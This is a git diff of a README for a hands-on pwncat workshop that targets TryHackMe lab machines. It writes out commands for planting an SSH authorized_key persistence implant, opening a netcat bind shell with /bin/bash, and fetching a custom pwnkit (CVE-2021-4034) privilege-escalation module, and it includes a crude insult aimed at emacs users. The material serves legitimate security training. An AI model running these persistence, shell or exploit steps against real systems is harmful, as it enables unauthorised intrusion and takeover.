@@ -2,15 +2,15 @@
 Workshop materials for my 'Introduction to pwncat and custom attack modules'
 
 ## Introduction
-[pwncat](https://github.com/calebstewart/pwncat) is a command and control framework which turns a basic reverse or bind shell into a fully-featured exploitation platform. In this workshop you will get an introduction to how to use the platform, and how to write your first custom module.
+[pwncat](https://github.com/calebstewart/pwncat) is a command and control framework which turns a basic reverse or bind shell into a fully-featured exploitation platform. In this workshop you will get an introduction to how to use the framework, and how to write your first custom module.
 
 There are a few pre-requisites:
 
 1. You need to [install pwncat-cs](https://pwncat.readthedocs.io/en/latest/installation.html) on a Linux host with Internet access.
-2. You need to install Python3 on your Linux host. You might want to also install VS Code. vi is fine. nano is acceptable as a last resort. You emacs tards are right out. (ok, ok... you can use that too if you like). Actually, use whatever text editor you want... who am I to judge?
-2. You need a free account on TryHackMe. [Sign up here](https://tryhackme.com/) if you don't already have an account.
-3. You need to be connected to the TryHackMe network with OpenVPN. You can [download your OVPN file here](https://tryhackme.com/access). No clue on how to use OVPN with THM? Then you should [complete this room](https://tryhackme.com/room/openvpn).
-4. You need to be attending the workshop. This isn't guaranteed to be a verbatim step-by-step lab. So you will need to be participating to have any clue what the heck some of these sections are about. The repo may be still useful to you, so have at 'er... but you've been warned.
+2. You need to install Python3 on your Linux host. You might want to also install VS Code. vi is fine. nano is acceptable as a last resort. You emacs wankers are right out. (ok, ok... you can use that too if you like). Actually, use whatever text editor you want... who am I to judge?
+3. You need a free account on TryHackMe. [Sign up here](https://tryhackme.com/) if you don't already have an account.
+4. You need to be connected to the TryHackMe network with OpenVPN. You can [download your OVPN file here](https://tryhackme.com/access). No clue on how to use OVPN with THM? Then you should [complete this room](https://tryhackme.com/room/openvpn).
+5. You need to be attending the workshop. This isn't guaranteed to be a verbatim step-by-step lab. So you will need to be participating to have any clue what the heck some of these sections are about. The repo may be still useful to you, so have at 'er... but you've been warned.
 
 ## Getting started with pwncat
 
@@ -78,11 +78,11 @@ pwncat offers several mechanisms to deploy **implants** that will allow persista
 - Backdoor account in /etc/passwd 
 
 So let's try to deploy an implant into the account we have access to:
-1. Generate a new SSH key pair: `ssh-keygen -f targ -C targgggrrrr
-2. Deploy the implant using pwncat: `run implant.authorized_key key=./targ`
+1. Generate a new SSH key pair: `ssh-keygen -f tmpkey -C tmpkey`
+2. Deploy the implant using pwncat: `run implant.authorized_key key=./tmpkey`
 3. Switch back to reomte-mode with `CTRL+D`
 4. Adjust perms on .ssh directory to leverage authorized_keys: `chmod 700 /home/shell/.ssh`
-5. From another console login using your keys: `pwncat-cs shell@vm.thm -i ./targ`
+5. From another console login using your keys: `pwncat-cs shell@vm.thm -i ./tmpkey`
 
 Success!! You've now got persistance!
 
@@ -91,15 +91,13 @@ Sometimes its a good idea to _leave no trace_. When you are done your engagement
 1. From local-mode, enter: `run implant list`. You should be able to see what implants you have left.
 2. Now let's remove any implants: `run implant remove`. You will have the option to remove individual implants, or all of them. Once done, the channel will close your connection.
 3. Try reconnecting with your keys. It SHOULD fail.
-4. Now log back in using `pwncat-cs shell@vm.thm`.... or for extra points if you have a second session open, reinstall the implant so you can connect back using `pwncat-cs shell@vm.thm -i ./targ`
+4. Now log back in using `pwncat-cs shell@vm.thm`.... or for extra points if you have a second session open, reinstall the implant so you can connect back using `pwncat-cs shell@vm.thm -i ./tmpkey`
 
 # Bind and reverse shells
 OK, so we showed how to use pwncat to connect via SSH. But its also really useful in catching shells. 
 
-For the next couple of exercises, we will use [revshells.com](https://www.revshells.com) to generate some of our shell code.
-
 Let's start with a bind shell:
-1. Connect to the THM vm using SSH (not pwncat): `ssh shell@vm.thm -i ./targ`
+1. Connect to the THM vm using SSH (not pwncat): `ssh shell@vm.thm -i ./tmpkey`
 2. Start a bind shell using netcat on your favorite port: `nc -lvnp 4444 -e /bin/bash`
 3. In another console window, connect to the bind shell using pwncat: `pwncat-cs vm.thm 4444`
 4. Switch to remote-mode: `CTRL+D`
@@ -125,7 +123,11 @@ One of the most powerful features of pwncat is the fact it offers a framework th
 
 But first, let's set up the scenario.
 
-Remember when we uploaded linpeas to the target and then downloaded the recon.txt file? When you did a `less -r recon.txt` and scrolled through it, you would have seen under the CVE checks that linpeas detected that this target was vulnerable to CVE-2021-4034 and even highlighted it in **GOLD** to call it out. This is commonly called the pwnkit vulnerability. Now, you can go and follow instructions online to manually exploit this... or just run my pwnkit module in pwncat. Let's give it a try:
+Remember when we uploaded linpeas to the target and then downloaded the recon.txt file? When you did a `less -r recon.txt` and scrolled through it, you would have seen under the CVE checks that linpeas detected that this target was vulnerable to CVE-2021-4034 and even highlighted it in **GOLD** to call it out. 
+
+This is commonly called the _pwnkit_ vulnerability. 
+
+Now, you can go and follow instructions online to manually exploit this... or just run my pwnkit module in pwncat. Let's give it a try:
 
 1. Download my pwnkit.py custom module: `curl -Ls https://raw.githubusercontent.com/DanaEpp/pwncat_pwnkit/main/pwnkit.py -O`
 2. Move `pwnkit.py` to `~/.local/share/pwncat/modules/`. You may need to create this directory if it doesn't exist
